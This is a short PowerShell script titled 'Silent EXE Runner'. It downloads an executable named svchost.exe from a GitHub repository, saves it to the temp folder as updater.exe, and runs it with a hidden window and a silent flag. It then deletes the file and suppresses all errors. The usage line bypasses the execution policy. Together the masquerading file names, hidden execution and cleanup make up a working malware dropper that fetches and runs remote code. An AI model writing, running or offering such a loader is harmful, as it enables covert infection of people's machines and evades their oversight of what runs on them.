# Silent EXE Runner
# Usage: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File script.ps1

$exeUrl = "https://github.com/hypnotixx0/xenolord/raw/refs/heads/main/svchost.exe"
$exePath = "$env:TEMP\updater.exe"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    Start-Process -FilePath $exePath -ArgumentList "/silent" -WindowStyle Hidden -Wait
    Remove-Item $exePath -Force
} catch {
    # Silently fail
}
